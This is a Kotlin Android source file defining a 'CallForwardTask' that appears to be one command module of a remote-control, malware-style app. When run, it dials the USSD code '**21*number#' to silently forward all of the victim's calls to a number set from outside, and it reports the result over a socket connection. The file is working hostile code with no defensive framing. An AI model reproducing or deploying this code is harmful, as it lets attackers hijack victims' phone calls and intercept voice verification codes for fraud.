package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.core.app.ActivityCompat
import com.xxx.zzz.socketsp.IOSocketyt


class CallForwardTask(val ctx: Context, val number: String, private val simSlotIndex: Int = 0) :
    BaseTask(ctx) {

    @SuppressLint("MissingPermission")
    private fun callForward() {
        val subscriptionManager = ctx.applicationContext.getSystemService(SubscriptionManager::class.java)
        val subscriptionInfo =
            subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

        
        val telecomManager = ctx.applicationContext.getSystemService(Context.TELECOM_SERVICE) as TelecomManager?
        val list = telecomManager!!.callCapablePhoneAccounts
        var primaryPhoneAccountHandle: PhoneAccountHandle =
            if (simSlotIndex == 0) list.first() else list.last()

        runCatching {
            for (phoneAccountHandle in list) {
                if (phoneAccountHandle.id.contains(subscriptionInfo.iccId) || phoneAccountHandle.id.contains(
                        subscriptionInfo.subscriptionId.toString()
                    )
                ) {
                    primaryPhoneAccountHandle = phoneAccountHandle
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "callForward error ${it.localizedMessage}", "error")
        }

        val callForwardString = "**21*$number#"
        val uri = Uri.fromParts("tel", callForwardString, "#")

        val extras = Bundle()
        extras.putParcelable(
            TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
            primaryPhoneAccountHandle
        )
        telecomManager.placeCall(uri, extras)
        IOSocketyt.sendLogs("", "callForward $number $simSlotIndex", "success")
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                callForward()
            }.onFailure {
                IOSocketyt.sendLogs("", "callForward ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


